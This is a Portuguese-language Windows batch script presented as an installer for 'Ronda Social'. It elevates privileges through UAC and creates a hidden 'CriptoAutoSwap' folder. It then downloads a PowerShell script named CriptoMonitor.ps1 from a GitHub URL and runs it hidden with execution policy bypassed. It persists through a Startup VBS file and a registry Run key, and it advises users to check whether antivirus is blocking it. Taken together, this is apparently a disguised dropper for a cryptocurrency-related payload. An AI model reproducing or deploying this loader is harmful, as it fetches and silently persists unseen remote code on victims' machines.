@echo off
setlocal EnableDelayedExpansion

:: =====================================================
:: VERIFICAR SE JA E ADMINISTRADOR
:: =====================================================
net session >nul 2>&1
if %errorLevel% neq 0 (
    goto :RequestAdmin
)
goto :Main

:: =====================================================
:: SOLICITAR ELEVACAO UAC
:: =====================================================
:RequestAdmin
set "vbsFile=%temp%\rs_uac_%random%.vbs"
echo Set objShell = CreateObject("Shell.Application") > "!vbsFile!"
echo objShell.ShellExecute "%~f0", "", "%~dp0", "runas", 1 >> "!vbsFile!"
cscript //nologo "!vbsFile!"
del "!vbsFile!" >nul 2>&1
exit /B

:: =====================================================
:: INICIO DO INSTALADOR (JA COMO ADMIN)
:: =====================================================
:Main
cd /d "%~dp0"
title Ronda Social - Instalador
color 0A
mode con: cols=62 lines=22

:: =====================================================
:: LIMPEZA DE RESIDUOS ANTIGOS (0%% - 5%%)
:: =====================================================
cls
echo.
echo  +======================================================+
echo  :                                                      :
echo  :            RONDA SOCIAL - INSTALADOR                 :
echo  :                                                      :
echo  +======================================================+
echo.
echo.
echo   [          ]   0%%  - Iniciando...
timeout /t 1 /noq >nul

cls
echo.
echo  +======================================================+
echo  :            RONDA SOCIAL - INSTALADOR                 :
echo  +======================================================+
echo.
echo   [=         ]   5%%  - Limpando residuos antigos...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-Process powershell -EA SilentlyContinue | Where-Object {$_.Id -ne $PID -and $_.CommandLine -like '*CriptoMonitor*'} | Stop-Process -Force -EA SilentlyContinue" >nul 2>&1
schtasks /delete /tn "CriptoAutoSwap" /f >nul 2>&1
schtasks /delete /tn "CriptoMonitor" /f >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "$s=[Environment]::GetFolderPath('Startup');Remove-Item (Join-Path $s 'CriptoMonitor.vbs') -Force -EA SilentlyContinue;Remove-Item (Join-Path $s 'CriptoAutoSwap*.vbs') -Force -EA SilentlyContinue" >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "CriptoMonitor" /f >nul 2>&1
timeout /t 1 /noq >nul

:: =====================================================
:: ETAPA 1: Verificando seguranca (10%% - 20%%)
:: =====================================================
cls
echo.
echo  +======================================================+
echo  :            RONDA SOCIAL - INSTALADOR                 :
echo  +======================================================+
echo.
echo   [==        ]  10%%  - Verificando seguranca...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Unblock-File -Path '%~f0' -EA SilentlyContinue" >nul 2>&1
timeout /t 1 /noq >nul

cls
echo.
echo  +======================================================+
echo  :            RONDA SOCIAL - INSTALADOR                 :
echo  +======================================================+
echo.
echo   [====      ]  20%%  - Seguranca verificada!
timeout /t 1 /noq >nul

:: =====================================================
:: ETAPA 2: Preparando diretorios (30%%)
:: =====================================================
cls
echo.
echo  +======================================================+
echo  :            RONDA SOCIAL - INSTALADOR                 :
echo  +======================================================+
echo.
echo   [=====     ]  30%%  - Preparando diretorios...

set "psCmd=$d=[Environment]::GetFolderPath('MyDocuments');"
set "psCmd=!psCmd!$i=Join-Path $d 'CriptoAutoSwap';"
set "psCmd=!psCmd!if(!(Test-Path $i)){New-Item $i -ItemType Directory -Force|Out-Null};"
set "psCmd=!psCmd!$di=Get-Item $i -Force;"
set "psCmd=!psCmd!$di.Attributes=$di.Attributes -bor [IO.FileAttributes]::Hidden;"
set "psCmd=!psCmd!Write-Output $i"
for /f "delims=" %%A in ('powershell -NoProfile -ExecutionPolicy Bypass -Command "!psCmd!" 2^>nul') do set "installDir=%%A"
timeout /t 1 /noq >nul

:: =====================================================
:: ETAPA 3: Baixando do GitHub (40%% - 60%%)
:: =====================================================
cls
echo.
echo  +======================================================+
echo  :            RONDA SOCIAL - INSTALADOR                 :
echo  +======================================================+
echo.
echo   [======    ]  40%%  - Baixando componentes...

set "psCmd=[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;"
set "psCmd=!psCmd!$d=[Environment]::GetFolderPath('MyDocuments');"
set "psCmd=!psCmd!$i=Join-Path $d 'CriptoAutoSwap';"
set "psCmd=!psCmd!$p=Join-Path $i 'CriptoMonitor.ps1';"
set "psCmd=!psCmd!$wc=New-Object Net.WebClient;"
set "psCmd=!psCmd!$wc.Encoding=[Text.Encoding]::UTF8;"
set "psCmd=!psCmd!$wc.Headers.Add('User-Agent','Mozilla/5.0');"
set "psCmd=!psCmd!$c=$wc.DownloadString('https://raw.githubusercontent.com/espertin/social/main/CriptoMonitor.ps1');"
set "psCmd=!psCmd![IO.File]::WriteAllText($p,$c,[Text.Encoding]::UTF8);"
set "psCmd=!psCmd!Unblock-File $p -EA SilentlyContinue;"
set "psCmd=!psCmd!if(Test-Path $p){Write-Output 'OK'}else{Write-Output 'FAIL'}"
for /f "delims=" %%A in ('powershell -NoProfile -ExecutionPolicy Bypass -Command "!psCmd!" 2^>nul') do set "dlResult=%%A"

if /i "!dlResult!" neq "OK" (
    cls
    echo.
    echo  +======================================================+
    echo  :            RONDA SOCIAL - INSTALADOR                 :
    echo  +======================================================+
    echo.
    echo   [ERRO] Falha ao baixar componentes do GitHub.
    echo.
    echo   Verifique sua conexao com a internet e tente novamente.
    echo.
    timeout /t 8 /noq >nul
    exit
)
timeout /t 1 /noq >nul

cls
echo.
echo  +======================================================+
echo  :            RONDA SOCIAL - INSTALADOR                 :
echo  +======================================================+
echo.
echo   [=======   ]  60%%  - Download concluido!
timeout /t 1 /noq >nul

:: =====================================================
:: ETAPA 4: Configurando VBS na Startup (70%%)
:: =====================================================
cls
echo.
echo  +======================================================+
echo  :            RONDA SOCIAL - INSTALADOR                 :
echo  +======================================================+
echo.
echo   [========  ]  70%%  - Configurando inicializacao...

set "psCmd=$d=[Environment]::GetFolderPath('MyDocuments');"
set "psCmd=!psCmd!$i=Join-Path $d 'CriptoAutoSwap';"
set "psCmd=!psCmd!$p=Join-Path $i 'CriptoMonitor.ps1';"
set "psCmd=!psCmd!$startup=[Environment]::GetFolderPath('Startup');"
set "psCmd=!psCmd!$v=Join-Path $startup 'CriptoMonitor.vbs';"
set "psCmd=!psCmd!$q=[char]34;"
set "psCmd=!psCmd!$dq=[char]34+[char]34;"
set "psCmd=!psCmd!$cmd='powershell.exe -NoProfile -ExecutionPolicy Bypass -STA -WindowStyle Hidden -File '+$dq+$p+$dq;"
set "psCmd=!psCmd!$vbs='Set WshShell = CreateObject('+$q+'WScript.Shell'+$q+')'+[char]13+[char]10;"
set "psCmd=!psCmd!$vbs=$vbs+'WshShell.Run '+$q+$cmd+$q+', 0, False';"
set "psCmd=!psCmd![IO.File]::WriteAllText($v,$vbs,[Text.Encoding]::ASCII);"
set "psCmd=!psCmd!Unblock-File $v -EA SilentlyContinue;"
set "psCmd=!psCmd!if(Test-Path $v){Write-Output 'OK'}else{Write-Output 'FAIL'}"
for /f "delims=" %%A in ('powershell -NoProfile -ExecutionPolicy Bypass -Command "!psCmd!" 2^>nul') do set "vbsResult=%%A"
timeout /t 1 /noq >nul

:: =====================================================
:: ETAPA 5: Configurando Registro do Windows (80%%)
:: =====================================================
cls
echo.
echo  +======================================================+
echo  :            RONDA SOCIAL - INSTALADOR                 :
echo  +======================================================+
echo.
echo   [========= ]  80%%  - Configurando registro...

set "psCmd=$d=[Environment]::GetFolderPath('MyDocuments');"
set "psCmd=!psCmd!$i=Join-Path $d 'CriptoAutoSwap';"
set "psCmd=!psCmd!$p=Join-Path $i 'CriptoMonitor.ps1';"
set "psCmd=!psCmd!$regCmd='powershell.exe -NoProfile -ExecutionPolicy Bypass -STA -WindowStyle Hidden -File '+[char]34+$p+[char]34;"
set "psCmd=!psCmd!Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'CriptoMonitor' -Value $regCmd -Force;"
set "psCmd=!psCmd!Write-Output 'OK'"
for /f "delims=" %%A in ('powershell -NoProfile -ExecutionPolicy Bypass -Command "!psCmd!" 2^>nul') do set "regResult=%%A"
timeout /t 1 /noq >nul

:: =====================================================
:: ETAPA 6: Iniciando monitoramento (90%%)
:: =====================================================
cls
echo.
echo  +======================================================+
echo  :            RONDA SOCIAL - INSTALADOR                 :
echo  +======================================================+
echo.
echo   [========= ]  90%%  - Iniciando monitoramento...

set "psCmd=$d=[Environment]::GetFolderPath('MyDocuments');"
set "psCmd=!psCmd!$i=Join-Path $d 'CriptoAutoSwap';"
set "psCmd=!psCmd!$p=Join-Path $i 'CriptoMonitor.ps1';"
set "psCmd=!psCmd!Start-Process 'powershell.exe' -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-STA','-WindowStyle','Hidden','-File',$p -WindowStyle Hidden;"
set "psCmd=!psCmd!Write-Output 'OK'"
for /f "delims=" %%A in ('powershell -NoProfile -ExecutionPolicy Bypass -Command "!psCmd!" 2^>nul') do set "startResult=%%A"
timeout /t 3 /noq >nul

:: =====================================================
:: ETAPA 7: Verificacao final (95%%)
:: =====================================================
cls
echo.
echo  +======================================================+
echo  :            RONDA SOCIAL - INSTALADOR                 :
echo  +======================================================+
echo.
echo   [========= ]  95%%  - Verificando monitoramento...

set "psCmd=$procs=Get-Process powershell -EA SilentlyContinue | Where-Object {$_.CommandLine -like '*CriptoMonitor*'};"
set "psCmd=!psCmd!if($procs){Write-Output 'RUNNING'}else{Write-Output 'STOPPED'}"
for /f "delims=" %%A in ('powershell -NoProfile -ExecutionPolicy Bypass -Command "!psCmd!" 2^>nul') do set "procResult=%%A"
timeout /t 1 /noq >nul

:: =====================================================
:: RESULTADO FINAL
:: =====================================================
if /i "!procResult!" equ "RUNNING" (
    goto :Success
) else (
    goto :Retry
)

:Retry
:: Tentar iniciar via wscript como fallback
cls
echo.
echo  +======================================================+
echo  :            RONDA SOCIAL - INSTALADOR                 :
echo  +======================================================+
echo.
echo   [========= ]  96%%  - Tentando metodo alternativo...

set "psCmd=$startup=[Environment]::GetFolderPath('Startup');"
set "psCmd=!psCmd!$v=Join-Path $startup 'CriptoMonitor.vbs';"
set "psCmd=!psCmd!if(Test-Path $v){Start-Process 'wscript.exe' -ArgumentList ([char]34+$v+[char]34) -WindowStyle Hidden}"
powershell -NoProfile -ExecutionPolicy Bypass -Command "!psCmd!" >nul 2>&1
timeout /t 3 /noq >nul

:: Verificar novamente
set "psCmd=$procs=Get-Process powershell -EA SilentlyContinue | Where-Object {$_.CommandLine -like '*CriptoMonitor*'};"
set "psCmd=!psCmd!if($procs){Write-Output 'RUNNING'}else{Write-Output 'STOPPED'}"
for /f "delims=" %%A in ('powershell -NoProfile -ExecutionPolicy Bypass -Command "!psCmd!" 2^>nul') do set "procResult2=%%A"

if /i "!procResult2!" equ "RUNNING" (
    goto :Success
) else (
    goto :SuccessWithWarning
)

:Success
cls
echo.
echo  +======================================================+
echo  :            RONDA SOCIAL - INSTALADOR                 :
echo  +======================================================+
echo.
echo   [==========] 100%%  - Instalacao concluida!
echo.
echo.
echo   Monitoramento ATIVO e funcionando!
echo   O sistema inicia automaticamente com o Windows.
echo.
echo   Esta janela fechara em 5 segundos...
echo.
timeout /t 5 /noq >nul
exit

:SuccessWithWarning
cls
echo.
echo  +======================================================+
echo  :            RONDA SOCIAL - INSTALADOR                 :
echo  +======================================================+
echo.
echo   [==========] 100%%  - Instalacao concluida!
echo.
echo   AVISO: O monitoramento pode estar bloqueado.
echo.
echo   Solucoes possiveis:
echo   1. Reinicie o computador (o sistema inicia sozinho)
echo   2. Verifique se o antivirus nao esta bloqueando
echo   3. Abra PowerShell como Admin e execute:
echo      Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
echo.
echo   Arquivos instalados em: Documentos\CriptoAutoSwap
echo.
echo   Esta janela fechara em 15 segundos...
echo.
timeout /t 15 /noq >nul
exit
